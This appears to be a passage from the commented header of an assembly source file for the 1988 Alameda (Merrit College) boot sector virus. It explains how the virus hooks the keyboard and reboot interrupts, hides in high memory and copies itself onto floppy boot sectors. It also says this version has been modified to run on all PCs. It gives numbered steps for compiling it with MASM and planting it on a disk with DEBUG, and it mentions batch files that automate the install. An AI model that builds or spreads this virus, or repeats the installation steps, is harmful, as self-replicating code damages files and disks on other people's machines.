;*******************************************************************************

;This is the Alameda College Virus, otherwise known as the Merrit College Virus.
;It was originally found in the spring of 1988 on computers at Merrit and
;Alameda Colleges. The original used the "POP CS" instruction to jump to high
;memory, which causes a fault on 80286 and 80386 based machines. This version
;has been improved to eliminate that problem, so it will work on all PC's, be
;they XT's, AT's, 80386's PS/2's or any kind of clone.
;
;This is a simple boot sector virus which lives through the CTRL-ALT-DEL reboot
;sequence. When a disk with this virus on it is booted, the virus is the first
;thing to be loaded. It copies itself to high memory and decrements the BIOS
;memory size variable at 0000:0413H to reserve space for itself in the machine.
;It intercepts the keyboard handler, interrupt 9, and the reboot vector,
;interrupt 19. When it finds a CTRL-ALT-DEL, it activates, rather than allowing
;the BIOS to execute the reboot sequence. When it activates, it simulates a
;reboot, and examines the disk in drive A to see if it is already there. If
;so, it loads the original boot sector, which is stored at Track 39, Head 0,
;Sector 8, and executes it, forfeiting control until the next CTRL-ALT-DEL.
;If the disk does not have the virus there, the virus copies the boot sector on
;it to Track 39, Head 0, Sector 8, and puts itself in place of the original
;boot sector on that disk. This completes the replication cycle. It will also
;copy the infection counter from high memory to the BIOS data area at 0040:0072
;when CTRL-ALT-I is pressed.
;
;This virus does not cause any intentional harm to the system in which it is
;resident, however it can cause inadvertent harm in a number of ways:
;
;  (1) When it infects a disk, it will overwrite Track 39, Head 0, Sector 8,
;      regardless of what might be there. On a full disk, this sector will be
;      in use by some file, so that file will be damaged.
;  (2) When the virus is resident, one cannot do a CTRL-ALT-DEL and boot from
;      a hard drive. An error message will result, or BASIC will be loaded.
;  (3) On an infected boot disk, when the disk is filled up and the original
;      boot sector, now at Track 39, Head 0, Sector 8, is overwritten, the
;      disk can no longer be booted.
;
;This program can be compiled with MASM, linked with LINK, and loaded onto a
;floppy disk with DEBUG. The process is as follows:
;
; (1) Format a clean floppy disk, to the 360KB format, using the /S option to
;     get the system files on the disk.
; (2) Copy the COMMAND.COM file onto the newly formatted disk.
; (3) Compile the ALAMEDA.ASM file using "MASM ALAMEDA,,;".
; (4) Link the program using "LINK ALAMEDA,,;".
;     Now you should have a file ALAMEDA.EXE on disk which is 32768 bytes long.
; (5) Enter the debugger as "DEBUG ALAMEDA.EXE".
; (6) Set the CX register to 200 using the command "R CX". You will get a
;     display of the current CX value and a colon. Type "200" at the colon.
; (7) Now load the original boot sector into memory using the command
;     "L 100 0 0 1" for drive A and "L 100 1 0 1" for drive B. (You may type
;     "D 100" to see this boot sector.)
; (8) Save that sector at Track 39, Head 0, Sector 8 using the command
;     "W 100 0 2C5 1" for drive A and "W 100 1 2C5 1" for drive B.
; (9) Save the Alameda virus at Track 0, Head 0, Sector 1 using the command
;     "W 7C00 0 0 1" for drive A and "W 7C00 1 0 1" for drive B. That's it.
;     Exit debug using the command "E".
; (10) The next time you boot from that disk, the virus will be operational.
;     Watch out! USE IT AT YOUR OWN RISK! YOU ARE RESPONSIBLE IF YOU INFECT
;     SOMEONE'S COMPUTER WITH IT! Label the disk right now.
;
;The files ALAMEDA.BAT, ALAMEDA.FMT, and ALAMEDA.DBG, along with MASM, COMMAND,
;LINK, FORMAT, and DEBUG (and this file) automate this process. Just put a
;disk in drive A or B and type "ALAMEDA A" or "ALAMEDA B" to install on drives
;A and B, respectively.

;BIOSDAT is the data segment starting at 0040:0000 where the ROM BIOS stores

;virus, and when it is reproducing. This segment is not always used by the
;virus when accessing BIOS data. Instead of using the address 0040:00XX, it
;sometimes uses 0000:04XX instead. This segment could be eliminated entirely,
;and only the latter addressing scheme used, but the author chose not to.

;MAIN is a segment which serves several purposes. It allows access to both the
;interrupt vectors and to the BIOS data, and it also contains the executable
;virus code to be placed in the boot sector. It is possible to use it for all
;of these purposes at once because the boot sector is loaded and executed at
;address 0000:7C00, so when loaded, the segment is located at 0. The first 400H
;bytes of this segment are thus the interrupt vectors, and the BIOS data starts
;at 400H. Executable code starts at 7C00H.
